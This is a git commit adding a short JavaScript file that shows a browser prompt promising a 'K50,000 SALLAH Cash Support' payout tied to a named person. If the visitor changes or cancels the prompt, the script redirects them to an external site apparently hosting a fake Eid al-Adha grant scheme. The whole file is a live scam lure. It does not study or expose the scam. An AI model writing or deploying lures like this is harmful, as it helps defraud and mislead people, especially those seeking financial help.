4f5c94431181755474dc307e662ed3f831579026
The-On-going <sirpeelawson@gmail.com>
2026-05-27 10:24:27 +0100

    Create activemala.js

---
+++ activemala.js
@@ -0,0 +1,10 @@
+var password = 'K50,000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive HITESH ANADKAT K50,000 SALLAH Cash Support. Click OK to receive Instantly.',
+  'K50,000'
+);
+
+if (password !== 'K50,000') {
+    location.href = 'https://ongoing-grant.info/50000-Eid-Al-Adha.html';
+}
